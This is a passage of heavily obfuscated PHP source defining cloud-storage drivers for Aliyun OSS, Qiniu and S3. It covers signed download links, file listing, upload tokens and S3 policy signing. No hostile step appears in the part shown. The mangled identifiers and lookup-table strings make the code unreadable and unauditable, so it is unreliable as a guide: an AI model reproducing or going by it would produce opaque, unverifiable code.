$·±˜ĞÏ¯); $‚›Ö©ıî = $this->client->signUrl($this->bucket, $this->pathEncode($ü€ÁÔú), 3600 * 12, $ŞïÌî“¿[237], $·±˜ĞÏ¯); return $this->getCdnLink($‚›Ö©ıî); } catch (OSS\Core\OssException $İˆîşÎ) { return !1; } } public function fileOut($˜æ¾Ç¨, $à¿úì°Œ = false, $¤çÅóª¯ = false, $ÖÕ„­ãø = '') { $¦ŸàÜÊÈ =& $_SERVER[ë¦»ºéÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($˜æ¾Ç¨, $à¿úì°Œ, $¤çÅóª¯, $ÖÕ„­ãø); } if (!$¤çÅóª¯) { $¤çÅóª¯ = $this->pathThis($˜æ¾Ç¨); } $¤çÅóª¯ = rawurlencode($¤çÅóª¯); $Ø¥Ò¼Ñ = get_file_mime(get_path_ext($¤çÅóª¯)); if ($Ø¥Ò¼Ñ == $¦ŸàÜÊÈ[224]) { return parent::fileOut($˜æ¾Ç¨, $à¿úì°Œ, $¤çÅóª¯, $ÖÕ„­ãø); } $à¿úì°Œ = $à¿úì°Œ ? $¦ŸàÜÊÈ[1398] : $¦ŸàÜÊÈ[1399]; $¡•£èÅ™ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¦ŸàÜÊÈ[1400] . rawurlencode("{$à¿úì°Œ}\73\x66\x69\x6c\145\x6e\x61\x6d\x65\x3d{$¤çÅóª¯}")); $¡•£èÅ™[OSS\OssClient::OSS_SUB_RESOURCE] .= $¦ŸàÜÊÈ[1401] . rawurlencode($Ø¥Ò¼Ñ); $óÏÚ±´‚ = $this->link($˜æ¾Ç¨, $¡•£èÅ™); $this->fileOutLink($óÏÚ±´‚); } public function fileOutServer($¸‰¬üÖë, $ü½‚ôÜ¹ = false, $”®ÆñÚñ = false, $Ç¯ïéâ« = '') { parent::fileOut($¸‰¬üÖë, $ü½‚ôÜ¹, $”®ÆñÚñ, $Ç¯ïéâ«); } public function fileOutImage($½ğ–ªÍì, $ £•‹¦è = 250) { $ë‰÷€Ï² = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ë¦»ºéÌ][1402] . $ £•‹¦è); $›ŒŞÇ = $this->link($½ğ–ªÍì, $ë‰÷€Ï²); $this->fileOutLink($›ŒŞÇ); } public function fileOutImageServer($ä–ƒŒâ¸, $·…—ÊÆ = 250) { parent::fileOutImage($ä–ƒŒâ¸, $·…—ÊÆ); } public function fileOutLink($£”˜ˆ¡¯) { $‚×çÆ° =& $_SERVER[ë¦»ºéÌ]; if (!$this->isCdnHost() && substr($£”˜ˆ¡¯, 0, 7) == $‚×çÆ°[1303]) { $£”˜ˆ¡¯ = $‚×çÆ°[1304] . substr($£”˜ˆ¡¯, 7); } header($‚×çÆ°[170] . $£”˜ˆ¡¯); die; } public function hashMd5($®Š’¿‹, $Á‘ê£Í = '') { $ùïã¨š =& $_SERVER[ë¦»ºéÌ]; $¸èóÑ»‚ = $this->_objectMeta($®Š’¿‹); if (!$¸èóÑ»‚) { return $ùïã¨š[12]; } if (!isset($¸èóÑ»‚[$ùïã¨š[1377]]) && !empty($Á‘ê£Í)) { $Ãú¼éôŒ = $this->updateObjMeta($®Š’¿‹, array($ùïã¨š[1377] => $Á‘ê£Í)); $¸èóÑ»‚[$ùïã¨š[1377]] = $Ãú¼éôŒ ? $Á‘ê£Í : $ùïã¨š[12]; } return isset($¸èóÑ»‚[$ùïã¨š[1377]]) ? strtolower($¸èóÑ»‚[$ùïã¨š[1377]]) : $ùïã¨š[12]; } public function size($áƒ‚úûĞ) { $¯ßŸúêç = $this->objectMeta($áƒ‚úûĞ); return $¯ßŸúêç ? $¯ßŸúêç[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function info($éñ÷ì¥å) { if ($this->isFolder($éñ÷ì¥å)) { return $this->folderInfo($éñ÷ì¥å); } else { if ($this->isFile($éñ÷ì¥å)) { return $this->fileInfo($éñ÷ì¥å); } } return !1; } public function exist($Á†¾Üü‡) { return $this->isFile($Á†¾Üü‡) || $this->isFolder($Á†¾Üü‡); } public function isFile($ãõâ¿¹Ë) { return !$this->isFolder($ãõâ¿¹Ë) && $this->objectMeta($ãõâ¿¹Ë); } public function isFolder($²Ä¬è²ô) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][210], $²Ä¬è²ô); } protected function objectMeta($İ™³ÚĞ) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][211], $İ™³ÚĞ); } protected function _objectMeta($çãî¾ÊÃ) { $ùªş»ê =& $_SERVER[ë¦»ºéÌ]; try { $¨ğƒó§ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($çãî¾ÊÃ)); } catch (OSS\Core\OssException $ˆ÷ĞË) { $¨ğƒó§ = !1; } if ($¨ğƒó§) { $¨ğƒó§[$ùªş»ê[90]] = intval($¨ğƒó§[$ùªş»ê[1375]]); } return $¨ğƒó§; } protected function _isFolder($ñ’¸òÏÓ) { $÷ñßØ¬­ =& $_SERVER[ë¦»ºéÌ]; if ($ñ’¸òÏÓ == $÷ñßØ¬­[12] || $ñ’¸òÏÓ == $÷ñßØ¬­[8]) { return !0; } $ï”½ÏÖ = array($÷ñßØ¬­[1371] => $÷ñßØ¬­[8], $÷ñßØ¬­[1372] => rtrim($ñ’¸òÏÓ, $÷ñßØ¬­[8]) . $÷ñßØ¬­[8], $÷ñßØ¬­[1373] => 1, $÷ñßØ¬­[1374] => $÷ñßØ¬­[12]); $°ü´òä = $this->client->listObjects($this->bucket, $ï”½ÏÖ); if ($°ü´òä->getObjectList() || $°ü´òä->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ÉŒÒéÁÉ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ë¦»ºéÌ][1403]; $this->_init($ÉŒÒéÁÉ); } public function _init($²œÀíĞ–) { $¢ÆÆÂş =& $_SERVER[ë¦»ºéÌ]; foreach ($²œÀíĞ– as $©™™Õ™‚ => $ô¬îâæÚ) { if (isset($this->{$©™™Õ™‚})) { $this->{$©™™Õ™‚} = $ô¬îâæÚ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¢ÆÆÂş[1404] . LNG($¢ÆÆÂş[1362])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ü£‘Ûçú, $•»ƒİÜ¸ = '', $Öõ‚öèö = REPEAT_RENAME) { if ($this->setContent($ü£‘Ûçú, $•»ƒİÜ¸)) { return $this->getPathOuter($ü£‘Ûçú); } return !1; } public function mkdir($Ù×¡ÓáÊ, $ßËßøòø = REPEAT_SKIP) { $ø×»í”ğ =& $_SERVER[ë¦»ºéÌ]; $É‹£«Ø² = trim($Ù×¡ÓáÊ, $ø×»í”ğ[8]); if ($this->_isFolder($É‹£«Ø²)) { return $this->getPathOuter($É‹£«Ø²); } $Ù×¡ÓáÊ = $É‹£«Ø² . $ø×»í”ğ[8]; $ß”á¼ç› = get_path_this($É‹£«Ø²); $Øâ‘çüò = $Ù×¡ÓáÊ . $ß”á¼ç›; if (!$this->mkfile($Øâ‘çüò)) { return !1; } if (!$this->moveFile($Øâ‘çüò, $Ù×¡ÓáÊ)) { $this->delFile($Øâ‘çüò); return !1; } return $this->getPathOuter($É‹£«Ø²); } public function copyFile($ÄçàÊï­, $å‘¡Åìİ) { $Í¢ò³åô = $this->bucketManager->copy($this->bucket, $ÄçàÊï­, $this->bucket, $å‘¡Åìİ, !0); return $Í¢ò³åô ? !1 : $this->getPathOuter($å‘¡Åìİ); } public function moveFile($éµö“¾û, $àèïäª) { $Öó•ó“› = $this->bucketManager->move($this->bucket, $éµö“¾û, $this->bucket, $àèïäª, !0); return $Öó•ó“› ? !1 : $this->getPathOuter($àèïäª); } public function delFile($µçá³ÖŸ) { if (!$this->exist($µçá³ÖŸ)) { return !0; } $ã®¦ôö› = $this->bucketManager->delete($this->bucket, $µçá³ÖŸ); return $ã®¦ôö› ? !1 : !0; } public function delFolder($ãÊî¯‡) { $ƒ’Ò»Ó® =& $_SERVER[ë¦»ºéÌ]; if (!$this->exist($ãÊî¯‡)) { return !0; } $this->listItemCache = !1; $¯¹Ëç¶ = $this->fileList($ãÊî¯‡); $this->listItemCache = !0; $´†×Ïîñ = trim($ãÊî¯‡, $ƒ’Ò»Ó®[8]) . $ƒ’Ò»Ó®[8]; if (!empty($ãÊî¯‡) && $ãÊî¯‡ !== $ƒ’Ò»Ó®[202] && !in_array($´†×Ïîñ, $¯¹Ëç¶[$ƒ’Ò»Ó®[87]])) { $¯¹Ëç¶[$ƒ’Ò»Ó®[87]][] = $´†×Ïîñ; } $÷•ûäñ = $this->delByBatch($¯¹Ëç¶[$ƒ’Ò»Ó®[86]]); if (!$÷•ûäñ) { return !1; } $÷•ûäñ = $this->delByBatch($¯¹Ëç¶[$ƒ’Ò»Ó®[87]]); if (!$÷•ûäñ) { return !1; } return $this->delFile($´†×Ïîñ); } private function delByBatch($Öµ‚â¦) { foreach (array_chunk($Öµ‚â¦, 1000) as $ØòÈ…°Œ) { $Ñ²‡×—Ú = $this->bucketManager->buildBatchDelete($this->bucket, $ØòÈ…°Œ); list($ù…¢ş‡, $¿¬÷Ç…ù) = $this->bucketManager->batch($Ñ²‡×—Ú); if ($¿¬÷Ç…ù) { return !1; } } return !0; } public function rename($Üé¼œ È, $Ô±Ùˆµ‡) { return $this->renameObject($Üé¼œ È, $Ô±Ùˆµ‡); } public function fileInfo($æ°ã±°œ, $Îü“”ÈÀ = false, $íæŸÍôë = array()) { $ğ½³¸§ =& $_SERVER[ë¦»ºéÌ]; $µ¸å÷öß = array($ğ½³¸§[42] => $this->pathThis($æ°ã±°œ), $ğ½³¸§[88] => $this->getPathOuter($ğ½³¸§[8] . $æ°ã±°œ), $ğ½³¸§[43] => $ğ½³¸§[204], $ğ½³¸§[90] => isset($íæŸÍôë[$ğ½³¸§[1405]]) ? $íæŸÍôë[$ğ½³¸§[1405]] : 0, $ğ½³¸§[179] => $this->ext($æ°ã±°œ)); if ($Îü“”ÈÀ) { return $µ¸å÷öß; } $µ¸å÷öß[$ğ½³¸§[205]] = $µ¸å÷öß[$ğ½³¸§[96]] = 0; $µ¸å÷öß[$ğ½³¸§[206]] = $µ¸å÷öß[$ğ½³¸§[207]] = !0; if (empty($íæŸÍôë)) { $íæŸÍôë = $this->objectMeta($æ°ã±°œ); if (!$íæŸÍôë) { return $µ¸å÷öß; } } if (isset($íæŸÍôë[$ğ½³¸§[1406]])) { $µ¸å÷öß[$ğ½³¸§[96]] = substr($íæŸÍôë[$ğ½³¸§[1406]] . $ğ½³¸§[12], 0, 10); } if (isset($íæŸÍôë[$ğ½³¸§[1405]])) { $µ¸å÷öß[$ğ½³¸§[90]] = $íæŸÍôë[$ğ½³¸§[1405]]; } return $µ¸å÷öß; } public function folderInfo($«¹¢²ÑÔ, $ò¥Ì¯Òó = false) { $†¿şõßû =& $_SERVER[ë¦»ºéÌ]; $–ÕØûåÖ = array($†¿şõßû[42] => $this->pathThis($«¹¢²ÑÔ), $†¿şõßû[88] => $this->getPathOuter($†¿şõßû[8] . $«¹¢²ÑÔ), $†¿şõßû[43] => $†¿şõßû[89]); if ($ò¥Ì¯Òó) { return $–ÕØûåÖ; } $–ÕØûåÖ[$†¿şõßû[205]] = $–ÕØûåÖ[$†¿şõßû[96]] = 0; $–ÕØûåÖ[$†¿şõßû[206]] = $–ÕØûåÖ[$†¿şõßû[207]] = !0; $«¹¢²ÑÔ = rtrim($«¹¢²ÑÔ, $†¿şõßû[8]) . $†¿şõßû[8]; $˜ûîêÀ = $this->objectMeta($«¹¢²ÑÔ); if (isset($˜ûîêÀ[$†¿şõßû[1406]])) { $–ÕØûåÖ[$†¿şõßû[96]] = substr($˜ûîêÀ[$†¿şõßû[1406]] . $†¿şõßû[12], 0, 10); } return $–ÕØûåÖ; } public function listPath($ŸåÄ¨½, $¾¾ŒŞÍš = false) { $Ã¤ŒŒ’ =& $_SERVER[ë¦»ºéÌ]; $ú¬¾Ùƒ’ = $this->fileList($ŸåÄ¨½, $Ã¤ŒŒ’[8], !0); foreach ($ú¬¾Ùƒ’[$Ã¤ŒŒ’[87]] as $â¹šÚş => $õ“­ìõ) { $ú¬¾Ùƒ’[$Ã¤ŒŒ’[87]][$â¹šÚş] = $this->folderInfo($õ“­ìõ, $¾¾ŒŞÍš); } foreach ($ú¬¾Ùƒ’[$Ã¤ŒŒ’[86]] as $â¹šÚş => $õ“­ìõ) { $ú¬¾Ùƒ’[$Ã¤ŒŒ’[86]][$â¹šÚş] = $this->fileInfo($õ“­ìõ[$Ã¤ŒŒ’[105]], $¾¾ŒŞÍš, $õ“­ìõ); } return $ú¬¾Ùƒ’; } public function has($¤÷µªŞ, $Ç½ˆÔñÙ = false, $™ÚÑÈ« = true) { $‰ìåì– =& $_SERVER[ë¦»ºéÌ]; $¤÷µªŞ = trim($¤÷µªŞ, $‰ìåì–[8]); $ààø«¾Î = empty($¤÷µªŞ) && $¤÷µªŞ !== $‰ìåì–[202] ? $‰ìåì–[12] : $¤÷µªŞ . $‰ìåì–[8]; $Å•ÇÔ¡ = $‰ìåì–[12]; $Ø®ä©Ù¬ = 500; $œ»²ê¿ = $‰ìåì–[8]; $Œº™‚™ = $–º­Ñ£ = 0; while (!0) { check_abort(); list($å£ú¿¢ñ, $˜ŸÔÍµ’) = $this->bucketManager->listFiles($this->bucket, $ààø«¾Î, $Å•ÇÔ¡, $Ø®ä©Ù¬, $œ»²ê¿); if ($˜ŸÔÍµ’) { break; } $Å•ÇÔ¡ = array_key_exists($‰ìåì–[1374], $å£ú¿¢ñ) ? $Å•ÇÔ¡ = $å£ú¿¢ñ[$‰ìåì–[1407]] : $‰ìåì–[12]; if ($Ç½ˆÔñÙ) { if (!empty($å£ú¿¢ñ[$‰ìåì–[1408]])) { $Œº™‚™ += count($å£ú¿¢ñ[$‰ìåì–[1408]]); } if (!empty($å£ú¿¢ñ[$‰ìåì–[1409]])) { $–º­Ñ£ += count($å£ú¿¢ñ[$‰ìåì–[1409]]); } if ($Å•ÇÔ¡ === $‰ìåì–[12]) { break; } continue; } if ($™ÚÑÈ«) { if (!empty($å£ú¿¢ñ[$‰ìåì–[1408]])) { return !0; } } else { if (!empty($å£ú¿¢ñ[$‰ìåì–[1409]])) { return !0; } } if ($Å•ÇÔ¡ === $‰ìåì–[12]) { break; } } if ($Ç½ˆÔñÙ) { return array($‰ìåì–[214] => $Œº™‚™, $‰ìåì–[215] => $–º­Ñ£); } return !1; } public function listAll($š³ÇƒäÍ) { $ã¯Ã¦İ =& $_SERVER[ë¦»ºéÌ]; $©Ş•şæ³ = $this->fileList($š³ÇƒäÍ, $ã¯Ã¦İ[12], !0); $ìğŸŸ³÷ = array(); foreach ($©Ş•şæ³[$ã¯Ã¦İ[86]] as $Èû‰ÄÓ) { $ìğŸŸ³÷[$Èû‰ÄÓ[$ã¯Ã¦İ[105]]] = $Èû‰ÄÓ[$ã¯Ã¦İ[90]]; } foreach ($©Ş•şæ³[$ã¯Ã¦İ[87]] as $Èû‰ÄÓ) { if (is_string($Èû‰ÄÓ)) { $ìğŸŸ³÷[$Èû‰ÄÓ] = 0; } } return $this->listAllFiles($š³ÇƒäÍ, array_keys($ìğŸŸ³÷), $ìğŸŸ³÷); } private function fileList($Ø…Ù®†Ù, $‹ä“ê†’ = '', $¬ã‡îÅ„ = 0) { $¥¨ù—¼ò =& $_SERVER[ë¦»ºéÌ]; $Ø…Ù®†Ù = trim($Ø…Ù®†Ù, $¥¨ù—¼ò[8]); $¹ìÌİÖş = empty($Ø…Ù®†Ù) && $Ø…Ù®†Ù !== $¥¨ù—¼ò[202] ? $¥¨ù—¼ò[12] : $Ø…Ù®†Ù . $¥¨ù—¼ò[8]; $ö¤À¦ì± = $¥¨ù—¼ò[12]; $®”Æµ– = 1000; $®Õ‡ı­İ = $this->listItemCache === !1 ? !1 : !0; $ø‡â¬¬÷ = $ÍéÉí€ = array(); while (!0) { check_abort(); list($±ÁÓş¥ë, $Ë¬ó‰€î) = $this->bucketManager->listFiles($this->bucket, $¹ìÌİÖş, $ö¤À¦ì±, $®”Æµ–, $‹ä“ê†’); if ($Ë¬ó‰€î) { break; } $ö¤À¦ì± = array_key_exists($¥¨ù—¼ò[1374], $±ÁÓş¥ë) ? $ö¤À¦ì± = $±ÁÓş¥ë[$¥¨ù—¼ò[1407]] : $¥¨ù—¼ò[12]; $’ŒÎïñ± = isset($±ÁÓş¥ë[$¥¨ù—¼ò[1408]]) ? $±ÁÓş¥ë[$¥¨ù—¼ò[1408]] : array(); $Şâ©«®Ñ = isset($±ÁÓş¥ë[$¥¨ù—¼ò[1409]]) ? $±ÁÓş¥ë[$¥¨ù—¼ò[1409]] : array(); foreach ($’ŒÎïñ± as $œ‰©²°¬) { if ($œ‰©²°¬[$¥¨ù—¼ò[105]] == $¹ìÌİÖş) { continue; } $õ×°çªï = $œ‰©²°¬[$¥¨ù—¼ò[105]]; $Ûóå×†  = $œ‰©²°¬[$¥¨ù—¼ò[1405]]; $œ‰©²°¬[$¥¨ù—¼ò[90]] = $Ûóå×† ; $¨§ØÏš = $Ûóå×†  == 0 && substr($õ×°çªï, strlen($õ×°çªï) - 1, 1) == $¥¨ù—¼ò[8] ? !0 : !1; if ($®Õ‡ı­İ) { $this->cacheMethod($¥¨ù—¼ò[210], $õ×°çªï, $¨§ØÏš); $this->cacheMethod($¥¨ù—¼ò[211], $õ×°çªï, $œ‰©²°¬); } if ($¨§ØÏš) { $ø‡â¬¬÷[] = $õ×°çªï; continue; } $ÍéÉí€[] = $¬ã‡îÅ„ ? $œ‰©²°¬ : $õ×°çªï; } foreach ($Şâ©«®Ñ as $õ×°çªï) { if ($õ×°çªï == $¹ìÌİÖş) { continue; } $ø‡â¬¬÷[] = $õ×°çªï; if ($®Õ‡ı­İ) { $this->cacheMethod($¥¨ù—¼ò[210], $õ×°çªï, !0); } } if ($ö¤À¦ì± === $¥¨ù—¼ò[12]) { break; } } if ($®Õ‡ı­İ) { $this->cacheMethod($¥¨ù—¼ò[210], $Ø…Ù®†Ù, !0); } return array($¥¨ù—¼ò[87] => $ø‡â¬¬÷, $¥¨ù—¼ò[86] => $ÍéÉí€); } public function canRead($ÃşüÆ²Ê) { return $this->exist($ÃşüÆ²Ê) ? !0 : !1; } public function canWrite($ÖøçãÛ) { return $this->exist($ÖøçãÛ) ? !0 : !1; } public function getContent($Áô„‰²É) { return $this->fileSubstr($Áô„‰²É, 0, -1); } public function setContent($€¢ãÁ—Ò, $ïİŸ™û® = '') { $‰Ñ‰²«ù = $this->tempFile($this->pathThis($€¢ãÁ—Ò)); file_put_contents($‰Ñ‰²«ù, $ïİŸ™û®); if ($this->upload($€¢ãÁ—Ò, $‰Ñ‰²«ù)) { $this->tempFileRemve($‰Ñ‰²«ù); return !0; } return !1; } public function refreshUrls($£‡ş›“Ï) { $ŞıâÙÉ´ =& $_SERVER[ë¦»ºéÌ]; $ƒôÁ„ğ¢ = array(); if (is_array($£‡ş›“Ï)) { foreach ($£‡ş›“Ï as $ßäç…ºÌ) { $ƒôÁ„ğ¢[] = $this->link($ßäç…ºÌ); } } else { $ƒôÁ„ğ¢[] = $this->link($£‡ş›“Ï); } $í…ì¤Û® = new Qiniu\Cdn\CdnManager($this->auth); list($ğÁ÷ áª, $ó¼ˆùè¦) = $í…ì¤Û®->refreshUrls($ƒôÁ„ğ¢); if ($ó¼ˆùè¦) { return !1; } return $ğÁ÷ áª[$ŞıâÙÉ´[1161]] == $ŞıâÙÉ´[744] ? !0 : !1; } public function fileSubstr($ŸôÕËÔ–, $¹è„œıó, $Ñ½Áç²ß) { $¡œÑ“›ä =& $_SERVER[ë¦»ºéÌ]; if (!($¿ˆé§ş” = $this->link($ŸôÕËÔ–))) { return !1; } $Ö¹£ŠÚÍ = !1; if ($Ñ½Áç²ß > 0) { $İèÕ—‘ = $¹è„œıó + $Ñ½Áç²ß - 1; $Ö¹£ŠÚÍ = array($¡œÑ“›ä[1410] . $¹è„œıó . $¡œÑ“›ä[462] . $İèÕ—‘); } $ŒÒ·¤ú = url_request($¿ˆé§ş”, $¡œÑ“›ä[237], !1, $Ö¹£ŠÚÍ); return $ŒÒ·¤ú[$¡œÑ“›ä[734]] ? $ŒÒ·¤ú[$¡œÑ“›ä[1171]] : !1; } public function upload($¾Øçãş, $½àéŸÔÖ, $ê¥Û°Å³ = false, $×å¥±¿š = REPEAT_REPLACE) { $›•ò•ÇÄ = new Qiniu\Storage\UploadManager(); $˜È‚ğ– = $this->auth->uploadToken($this->bucket, $¾Øçãş); $Ôô•ôÕ = get_file_mime(get_path_ext($½àéŸÔÖ)); list($ùÍÁ¦˜°, $¨Çè…) = $›•ò•ÇÄ->putFile($˜È‚ğ–, $¾Øçãş, $½àéŸÔÖ, null, $Ôô•ôÕ); return $¨Çè… ? !1 : $this->getPathOuter($¾Øçãş); } public function uploadFormData($¾ŠãşÔ”, $”Õîş„Ö = 3600) { return $this->uploadToken($¾ŠãşÔ”, $”Õîş„Ö); } public function multiUploadFormData($÷ğ”½, $§ Í²¿Ù = 3600) { return $this->uploadToken($÷ğ”½, $§ Í²¿Ù); } private function uploadToken($ĞÄ˜ÖÄº, $…ƒö•â¸ = 3600) { $³¡Ç£³µ =& $_SERVER[ë¦»ºéÌ]; $ı‰ÖĞÚ® = $…ƒö•â¸; $ø°†Â = array($³¡Ç£³µ[1411] => $³¡Ç£³µ[1412]); $°©µ»” = $ĞÄ˜ÖÄº; $Úşç—¶Ø = $this->auth->uploadToken($this->bucket, $°©µ»”, $ı‰ÖĞÚ®, $ø°†Â, !0); $ûãÎ´¦‘ = empty($this->region) || $this->region == $³¡Ç£³µ[1413] ? $³¡Ç£³µ[12] : $³¡Ç£³µ[462] . $this->region; $ŞÆÈ™ïÄ = http_type() . "\x3a\57\57\x75\x70\154\x6f\141\144{$ûãÎ´¦‘}\56\161\x69\x6e\x69\165\x70\56\x63\x6f\x6d\x2f"; return array($³¡Ç£³µ[1414] => $Úşç—¶Ø, $³¡Ç£³µ[1415] => $ŞÆÈ™ïÄ); } public function download($·Ş¤šÌä, $±Ãï–é) { $åç†ëÊ÷ = IO::getPathInner(IO::mkfile($±Ãï–é)); if (!($Ö˜üëÌú = $this->link($·Ş¤šÌä))) { return !1; } $ÃÖ˜ñ ö = 0; $€’¯ á = 1024 * 200; $Â›ëàıú = fopen($åç†ëÊ÷, $_SERVER[ë¦»ºéÌ][1416]); while (!0) { $ç«ÂĞ¶Ô = $this->fileSubstr($·Ş¤šÌä, $ÃÖ˜ñ ö, $€’¯ á); if ($ç«ÂĞ¶Ô === !1) { return !1; } fwrite($Â›ëàıú, $ç«ÂĞ¶Ô); $ÃÖ˜ñ ö += $€’¯ á; if (strlen($ç«ÂĞ¶Ô) < $€’¯ á) { break; } } fclose($Â›ëàıú); return $±Ãï–é; } public function link($®±ØÊé×, $¯Åˆ­ê = '') { if (!$this->isFile($®±ØÊé×)) { return !1; } $¦ƒ„àÍÁ = $this->getHost() . $_SERVER[ë¦»ºéÌ][8] . $this->pathEncode($®±ØÊé×) . $¯Åˆ­ê; return $this->auth->privateDownloadUrl($¦ƒ„àÍÁ, 3600 * 12); } public function fileOut($¥†‚¶, $•ªˆê®¸ = false, $­¤Û–­Ì = false, $ˆÕä¦ä– = '') { $ºğ­Åê¶ =& $_SERVER[ë¦»ºéÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¥†‚¶, $•ªˆê®¸, $­¤Û–­Ì, $ˆÕä¦ä–); } if (!$­¤Û–­Ì) { $­¤Û–­Ì = $this->pathThis($¥†‚¶); } $¢˜ºÕôâ = $•ªˆê®¸ ? $ºğ­Åê¶[1417] . rawurlencode($­¤Û–­Ì) : $ºğ­Åê¶[12]; $Âé…’Û¬ = $this->link($¥†‚¶, $¢˜ºÕôâ); $this->fileOutLink($Âé…’Û¬); } public function fileOutServer($Êñ©ò•¸, $ÆÒÉ…¦û = false, $¾ŒÏ› = false, $ÙÌêˆ¸­ = '') { parent::fileOut($Êñ©ò•¸, $ÆÒÉ…¦û, $¾ŒÏ›, $ÙÌêˆ¸­); } public function fileOutImage($ì¡¸§Ç€, $Î¦¦ô¡İ = 250) { $çŞİŠ = $this->link($ì¡¸§Ç€, $_SERVER[ë¦»ºéÌ][1418] . $Î¦¦ô¡İ); $this->fileOutLink($çŞİŠ); } public function fileOutImageServer($Û‡şò€í, $ú¾‘¹µ‡ = 250) { parent::fileOutImage($Û‡şò€í, $ú¾‘¹µ‡); } public function hashMd5($Şôê¡Â) { $†ƒöîßİ =& $_SERVER[ë¦»ºéÌ]; $úÕé«ß = $this->objectMeta($Şôê¡Â); return isset($úÕé«ß[$†ƒöîßİ[219]]) ? $úÕé«ß[$†ƒöîßİ[219]] : !1; $áúƒ¶ï = $this->link($Şôê¡Â, $†ƒöîßİ[1419]); } public function size($Ç„•è†·) { $´·ğùİ = $this->objectMeta($Ç„•è†·); return $´·ğùİ ? $´·ğùİ[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function info($í›ËÂà„) { if ($this->isFolder($í›ËÂà„)) { return $this->folderInfo($í›ËÂà„); } else { if ($this->isFile($í›ËÂà„)) { return $this->fileInfo($í›ËÂà„); } } return !1; } public function exist($¹ÒØîá) { return $this->isFile($¹ÒØîá) || $this->isFolder($¹ÒØîá); } public function isFile($ãğ‚âï) { return !$this->isFolder($ãğ‚âï) && $this->objectMeta($ãğ‚âï); } public function isFolder($†ãÜ´”š) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][210], $†ãÜ´”š); } protected function objectMeta($Ö§º¦è™) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][211], $Ö§º¦è™); } protected function _objectMeta($ı ¶æ˜š) { $¡²æ÷Œ½ =& $_SERVER[ë¦»ºéÌ]; list($©Ÿùô÷, $ËææŞ½¥) = $this->bucketManager->stat($this->bucket, $ı ¶æ˜š); if ($©Ÿùô÷) { $©Ÿùô÷[$¡²æ÷Œ½[90]] = intval($©Ÿùô÷[$¡²æ÷Œ½[1405]]); } return $©Ÿùô÷; } protected function _isFolder($«¾€úğ·) { $ÁâŸÁ˜œ =& $_SERVER[ë¦»ºéÌ]; if ($«¾€úğ· == $ÁâŸÁ˜œ[12] || $«¾€úğ· == $ÁâŸÁ˜œ[8]) { return !0; } list($²â­¿, $Àµº»Ğ˜) = $this->bucketManager->listFiles($this->bucket, trim($«¾€úğ·, $ÁâŸÁ˜œ[8]) . $ÁâŸÁ˜œ[8], $ÁâŸÁ˜œ[12], 1, $ÁâŸÁ˜œ[8]); return !empty($²â­¿[$ÁâŸÁ˜œ[1408]]) || !empty($²â­¿[$ÁâŸÁ˜œ[1409]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($±ÊÍºŠ) { parent::__construct($±ÊÍºŠ); } public function uploadFormData($ÎÅŸ§˜µ, $Ëˆçµºª = 3600) { $Ü÷«¸¯­ =& $_SERVER[ë¦»ºéÌ]; $îì£óş¼ = $Ü÷«¸¯­[203]; $²ìğ¾œ = $Ü÷«¸¯­[1324]; $Ğß„Ğ˜® = $Ü÷«¸¯­[72]; $èÎ¦ÙüÊ = gmdate($Ü÷«¸¯­[1325]); $š¡œøªµ = gmdate($Ü÷«¸¯­[735]); $†ßóèàë = $Ü÷«¸¯­[1326]; $£Îª¼û´ = $Ëˆçµºª . $Ü÷«¸¯­[12]; $¸á¤èô“ = $Ü÷«¸¯­[1288]; $¢¿şì– = array($this->accessKey, $š¡œøªµ, $this->region, $Ğß„Ğ˜®, $†ßóèàë); $´Ğ±Éôê = implode($Ü÷«¸¯­[8], $¢¿şì–); $²”ÉÁ¾Ì = array($Ü÷«¸¯­[1290] => gmdate($Ü÷«¸¯­[1289], strtotime($Ü÷«¸¯­[1327])), $Ü÷«¸¯­[1291] => array(array($Ü÷«¸¯­[1293] => $this->bucket), array($Ü÷«¸¯­[1292] => $îì£óş¼), array($Ü÷«¸¯­[1294], $Ü÷«¸¯­[1295], $Ü÷«¸¯­[12]), array($Ü÷«¸¯­[1294], $Ü÷«¸¯­[1328], $Ü÷«¸¯­[12]), array($Ü÷«¸¯­[1294], $Ü÷«¸¯­[1329], $Ü÷«¸¯­[12]), array($Ü÷«¸¯­[1296] => $¸á¤èô“), array($Ü÷«¸¯­[1330] => $´Ğ±Éôê), array($Ü÷«¸¯­[1331] => $²ìğ¾œ), array($Ü÷«¸¯­[1332] => $èÎ¦ÙüÊ), array($Ü÷«¸¯­[1333] => $£Îª¼û´))); $¾¢ğ“Şé = base64_encode(json_encode($²”ÉÁ¾Ì)); $Ó¤ƒ¹“Ğ = hash_hmac($Ü÷«¸¯­[1334], $š¡œøªµ, $Ü÷«¸¯­[1335] . $this->secret, !0); $Ğô–ĞÇõ = hash_hmac($Ü÷«¸¯­[1334], $this->region, $Ó¤ƒ¹“Ğ, !0); $ş¢³¡®³ = hash_hmac($Ü÷«¸¯­[1334], $Ğß„Ğ˜®, $Ğô–ĞÇõ, !0); $”Îƒ‡¶ß = hash_hmac($Ü÷«¸¯­[1334], $†ßóèàë, $ş¢³¡®³, !0); $èâ¡¬‰½ = hash_hmac($Ü÷«¸¯­[1334], $¾¢ğ“Şé, 